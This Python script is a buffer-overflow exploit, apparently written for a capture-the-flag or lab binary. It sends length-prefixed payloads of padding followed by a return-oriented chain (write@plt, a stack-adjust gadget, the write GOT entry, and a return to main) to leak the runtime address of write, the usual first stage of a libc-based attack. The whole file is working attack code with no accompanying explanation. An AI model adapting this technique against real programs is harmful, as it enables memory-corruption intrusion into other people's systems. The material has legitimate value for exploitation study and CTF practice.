from helper import *
from time import sleep

write_plt = hex2le("08048290")
write_got = hex2le("08049434")

quit_plt = hex2le("080482b0")

add0x1c = hex2le("080482ec")

main_ptr = hex2le("080482c0")

welcome = "Bye!\n\n"

def launch(expl):
    exploit = expl

    write_bytes(int2le(len(exploit)))
    write_bytes(exploit)

    response = ""
    while True:
        response += read_all(sys.stdin)
        if response.startswith(welcome):
            break
        sleep(0.2)
        
    response = response[len(welcome):]
    response = response[0:len(response)-1]
    return response

def main():
    log(read_all(sys.stdin))
    
    response = launch(20 * "B" +
           write_plt + \
           add0x1c + \
           write_got + \
           "A" * (0x1c - 4) + \
           main_ptr)

    write_addr = response[0:4]
    log(le2hex(write_addr))

    response = launch(20 * "B" +
           write_addr + \
           add0x1c + \
           write_got + \
           "A" * (0x1c - 4) + \
           main_ptr)

    write_addr = response[0:4]
    log(le2hex(write_addr))


if __name__ == "__main__":
    main()

